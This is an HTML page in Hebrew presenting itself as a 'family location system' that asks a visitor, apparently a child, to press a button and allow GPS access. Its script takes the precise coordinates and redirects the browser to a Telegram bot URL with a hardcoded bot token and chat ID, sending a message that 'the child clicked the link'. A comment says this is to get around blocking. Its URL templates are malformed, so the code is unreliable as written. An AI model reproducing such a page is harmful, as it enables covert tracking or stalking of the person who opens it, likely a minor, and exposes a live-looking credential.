<!DOCTYPE html>
<html lang="he" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>איתור מיקום למשפחה</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; padding: 50px 20px; background-color: #f0f2f5; }
        .container { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); max-width: 400px; margin: auto; }
        h1 { color: #333; font-size: 24px; }
        p { color: #666; font-size: 16px; margin-bottom: 25px; }
        .btn { display: inline-block; background-color: #28a745; color: white; padding: 15px 30px; font-size: 18px; font-weight: bold; border: none; border-radius: 5px; cursor: pointer; text-decoration: none; width: 100%; box-sizing: border-box; }
        .btn:hover { background-color: #218838; }
        .status { font-weight: bold; color: #007bff; font-size: 16px; margin-top: 20px; }
    </style>
</head>
<body>

<div class="container">
    <h1>מערכת איתור משפחתית</h1>
    <p>כדי לשלוח את המיקום המדויק להורים, לחץ על הכפתור הירוק למטה ואשר את בקשת המיקום שתקפוץ.</p>
    
    <!-- כפתור שמכריח את הדפדפן לאפשר בקשת GPS -->
    <button class="btn" onclick="startTracking()">📍 לחץ כאן לשיתוף מיקום</button>
    
    <div id="status" class="status"></div>
</div>

<script>
    const TELEGRAM_TOKEN = '8573992916:AAHFZye_BN7FwKRUJHS24D4pw99v9dwnG6A';
    const CHAT_ID = '8714686528';

    function startTracking() {
        updateStatus("מבקש גישה ל-GPS...");
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(sendLocation, showError, {
                enableHighAccuracy: true,
                timeout: 10000,
                maximumAge: 0
            });
        } else {
            updateStatus("הדפדפן שלך לא תומך בשליחת מיקום.");
        }
    }

    function sendLocation(position) {
        const lat = position.coords.latitude;
        const lon = position.coords.longitude;
        const accuracy = position.coords.accuracy;
        
        updateStatus("המיקום אותר! מעביר לטלגרם...");

        const mapsLink = `https://google.com{lat},${lon}`;
        const message = encodeURIComponent(`🚨 הילד לחץ על הקישור!\n📍 מיקום: ${mapsLink}\n🎯 רמת דיוק: ${Math.round(accuracy)} מטרים.`);

        // פתיחת חלון ישיר לשרת של טלגרם כדי לעקוף את כל החסימות
        window.location.href = `https://telegram.org{TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${message}`;
    }

    function showError(error) {
        switch(error.code) {
            case error.PERMISSION_DENIED:
                updateStatus("❌ שגיאה: חובה ללחוץ 'אשר' (Allow) על בקשת המיקום.");
                break;
            case error.POSITION_UNAVAILABLE:
                updateStatus("❌ שגיאה: ה-GPS במכשיר כבוי או לא זמין.");
                break;
            case error.TIMEOUT:
                updateStatus("❌ שגיאה: הזמן לבקשת המיקום עבר, נסה שוב.");
                break;
            default:
                updateStatus("❌ התרחשה שגיאה בלתי צפויה.");
                break;
        }
    }

    function updateStatus(text) {
        document.getElementById('status').innerText = text;
    }
</script>

</body>
</html>
